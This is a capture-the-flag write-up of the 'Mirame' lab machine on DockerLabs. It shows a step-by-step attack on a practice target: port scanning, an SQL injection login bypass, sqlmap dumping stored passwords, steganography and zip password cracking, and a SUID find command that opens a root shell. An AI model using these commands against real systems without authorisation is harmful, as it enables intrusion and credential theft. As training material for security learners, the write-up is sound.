# Mirame - Writeup

## 📋 General Information

- **Platform**: DockerLabs
- **Difficulty**: Easy
- **Categories**: Web Exploitation | SQL Injection | Cracking | Steganography | Privilege Escalation
- **Date**: 20/02/2026
- **Time spent**: ~30 minutes
- **Author**: Samuel Rodriguez aka Testarious

## 🔍 Recognition and Enumeration

### Port Scanning
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
nmap -sCV -p22,80 172.17.0.2
```

**Results:**
![Nmap](./content/screenshots/mirame/nmap.png)

As we can see in the port scan, port 80 is open, so we access the web (http://172.17.0.2). We find a website with a login panel.

## 💻 Exploitation

### SQL Injection

![Login](./content/screenshots/mirame/login.png)

We try to log in with common credentials like `admin:admin` among others, but we are not successful. So we try a SQL Injection in the username field with the payload `' OR 1=1 --` and it shows us a database error, which indicates that it is vulnerable to SQL Injection.

![SQL Injection](./content/screenshots/mirame/sqlerror.png)

Now we try with the payload `' OR 1=1 --` in both the username and password fields and we access the `/page.php` page.

![SQL Injection](./content/screenshots/mirame/consulta.png)

After exploring it a bit we see that there is nothing relevant here, so we return to the login panel and using the `sqlmap` tool we try to extract information from the database. To do this, we intercept the request with `Burp Suite` and export it to a `.txt` file to pass it to `sqlmap`.

![Burp Suite](./content/screenshots/mirame/burpsuite.png)

Now with the `sqlmap` tool we will enumerate the databases, tables and columns to obtain information.

```bash
sqlmap -r request.txt --batch --dbs

#Output:
available databases [2]:
[*] information_schema
[*] users
```

```bash
sqlmap -r request.txt --batch -D users --tables

#Output:
Database: users
[1 table]
+----------+
| usuarios |
+----------+
```

```bash
sqlmap -r request.txt --batch -D users -T usuarios --columns

#Output:
Database: users
Table: usuarios
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| password | varchar(255) |
| username | varchar(50)  |
+----------+--------------+
```

```bash
sqlmap -r request.txt --batch -D users -T usuarios --dump  

#Output:
Database: users
Table: usuarios
[4 entries]
+----+------------------------+------------+
| id | password               | username   |
+----+------------------------+------------+
| 1  | chocolateadministrador | admin      |
| 2  | lucas                  | lucas      |
| 3  | soyagustin123          | agustin    |
| 4  | directoriotravieso     | directorio |
+----+------------------------+------------+
```

### Steganography

Seeing these credentials, the password of the user `directorio` which is `directoriotravieso` catches our attention, so we try to access that directory via web.

![](./content/screenshots/mirame/directoriotravieso.png)

And we discover that there is an image called `miramebien.jpg`.

![](./content/screenshots/mirame/miramebien.png)

Here we are suggested to look carefully at the image (the name gives us the clue), so we proceed to analyze it with steganography tools.

```
# Steganography is the technique and science of hiding information (messages, files, data)
within another apparently harmless medium —images, audio, video or text— so that only the 
intended recipient knows its existence.
```

We use the `steghide` tool to extract hidden information in the image but it asks us for a password.

```bash
steghide extract -sf miramebien.jpg
```

![](./content/screenshots/mirame/steghide.png)

So we proceed to try to crack the password with `stegseek`.

```bash
stegseek miramebien.jpg /usr/share/wordlists/rockyou.txt
```

![](./content/screenshots/mirame/stegseek.png)

We obtain the password `chocolate` so now we can extract the content of the image with `steghide`.

```bash
steghide extract -sf miramebien.jpg
#Passphrase: chocolate
```

It gives us a file `ocultito.zip` and when trying to decompress it asks us for a password (which is not any of the previous ones). So we proceed to try to crack it with `zip2john` and `john`.

```bash
zip2john ocultito.zip > ocultito.hash
john ocultito.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![](./content/screenshots/mirame/john.png)

And we obtain the password `stupid1`. With which we can decompress the file `ocultito.zip` which provides us with a file `secret.txt` with what appears to be some credentials. So we proceed to try to use them to connect via SSH.

```bash
#secret.txt
carlos:carlitos

ssh carlos@172.17.0.2
# Password: carlitos
```

![](./content/screenshots/mirame/ssh.png)

We have access as `carlos` on the victim machine.

## 🔐 Privilege Escalation


Once logged in as the user `carlos`, we proceed to enumerate the system and look for binaries with special execution permissions (SUID).

```bash
find / -perm -4000 2>/dev/null
```

We find several binaries with SUID permissions. Among them, the binary `/usr/bin/find` catches our attention. We use the web resource `gtfobins.org` to find a way to escalate privileges. And it provides us with the following command:

```bash
find . -exec /bin/sh -p \; -quit
```

![](./content/screenshots/mirame/root.png)

And finally we are root on the victim machine!

## 🛠️ Tools Used

| Tool | Version | Specific use |
|-------------|---------|----------------|
| nmap | 7.98 | Port and service scanning |
| burpsuite | -- | HTTP traffic interception |
| sqlmap | 1.10 | SQL vulnerability scanning |
| steghide | 0.5.1 | Hidden file extraction |
| stegseek | 0.6 | Password cracking in hidden files |
| zip2john | -- | Hash generation for zip file cracking |
| john | 1.9.0-jumbo-1 | Password cracking |
| gtfobins | -- | Privilege escalation |

## 🏆 Conclusion

This CTF turned out to be quite entertaining and allowed me to learn new tools like `steghide`, `stegseek`, `zip2john` and `john`, allowing me to practice steganography and password cracking techniques. Also noteworthy is the use of `sqlmap` to exploit SQL Injection vulnerabilities. And finally, improve my skills in privilege escalation and the use of tools like `gtfobins`. Let's keep going! 🚀